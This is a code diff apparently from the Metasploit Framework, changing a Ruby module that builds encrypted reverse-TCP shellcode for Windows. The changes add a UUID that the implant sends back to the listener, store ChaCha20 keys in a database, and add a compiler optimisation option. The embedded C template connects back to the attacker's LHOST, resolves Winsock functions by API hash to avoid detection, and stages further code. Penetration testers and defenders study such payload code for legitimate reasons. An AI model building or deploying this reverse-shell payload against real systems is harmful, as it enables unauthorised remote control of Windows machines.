@@ -2,7 +2,9 @@
 
 require 'msf/core'
 require 'rex/peparsey'
+require 'msf/core/payload/uuid/options'
 require 'msf/core/payload/windows/encrypted_payload_opts'
+require 'msf/core/payload/windows/chacha'
 require 'metasploit/framework/compiler/mingw'
 require 'rex/crypto/chacha20'
 
@@ -15,14 +17,18 @@ module Msf
 ###
 module Payload::Windows::EncryptedReverseTcp
 
+  include Msf::Payload::UUID::Options
   include Msf::Payload::Windows
   include Msf::Payload::Windows::EncryptedPayloadOpts
+  include Msf::Payload::Windows::Chacha
+
 
   def initialize(*args)
     super
   end
 
   def generate(opts={})
+    opts[:uuid] ||= generate_payload_uuid.puid_hex
     block_count = "\x01\x00\x00\x00"
     iv = block_count + datastore['ChachaNonce']
 
@@ -33,7 +39,9 @@ module Payload::Windows::EncryptedReverseTcp
       host:            format_ds_opt(datastore['LHOST']),
       key:             datastore['ChachaKey'],
       nonce:           datastore['ChachaNonce'],
-      iv:              iv
+      iv:              iv,
+      uuid:            opts[:uuid],
+      staged:          staged? ? true : false
     }
 
     src = ''
@@ -48,11 +56,15 @@ module Payload::Windows::EncryptedReverseTcp
       strip_symbols: datastore['StripSymbols'],
       linker_script: datastore['LinkerScript'],
       align_obj:     datastore['AlignObj'] || '',
+      opt_lvl:       datastore['OptLevel'],
       f_name:        (staged? ? 'reverse_pic_staged.exe' : 'reverse_pic.exe'),
       arch:          self.arch_to_s
     }
 
-    get_compiled_shellcode(src, compile_opts)
+    comp_code = get_compiled_shellcode(src, compile_opts)
+    save_to_db(conf)
+
+    comp_code
   end
 
   def initial_code
@@ -77,14 +89,22 @@ module Payload::Windows::EncryptedReverseTcp
     src << comm_setup
     src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
-    src << start_comm
+    src << start_comm(conf[:uuid])
     src << stager_comm
+  end
+
+  def include_send_uuid
+    true
   end
 
   def generate_stage(opts)
     conf = opts[:datastore]
-    key = conf['ChachaKey']
-    nonce = conf['ChachaNonce']
+    key, nonce = get_key_nonce(opts[:uuid])
+    unless key && nonce
+      vprint_status('No existing key/nonce in db. Resorting to datastore options.')
+      key = conf['ChachaKey']
+      nonce = conf['ChachaNonce']
+    end
     iv = "\x01\x00\x00\x00" + nonce
 
     comp_opts =
@@ -117,7 +137,7 @@ module Payload::Windows::EncryptedReverseTcp
     src << init_proc
     src << get_load_library(conf[:host], conf[:port])
     src << call_init_winsock if conf[:call_wsastartup]
-    src << start_comm
+    src << start_comm(conf[:uuid])
     src << single_comm
   end
 
@@ -443,10 +463,11 @@ module Payload::Windows::EncryptedReverseTcp
     ^
   end
 
-  def start_comm
+  def start_comm(uuid)
     %Q^
         struct addrinfo *info = NULL;
         info = conn_info_setup(ip, port);
+        FuncSend SendData = (FuncSend) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'send')}); // hash('ws2_32.dll', 'send') -> 0x5f38ebc2
         WSASock = (FuncWSASocketA) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'WSASocketA')}); // hash('ws2_32.dll', 'WSASocketA') -> 0xe0df0fea
         conn_socket = WSASock(info->ai_family, info->ai_socktype, info->ai_protocol, NULL, 0, 0);
 
@@ -460,6 +481,9 @@ module Payload::Windows::EncryptedReverseTcp
         {
           ExitProcess(proc_term_status);
         }
+
+        char uuid[] = { #{format_ds_opt(uuid)} };
+        SendData(conn_socket, uuid, 16, 0);
 
       ^
    end
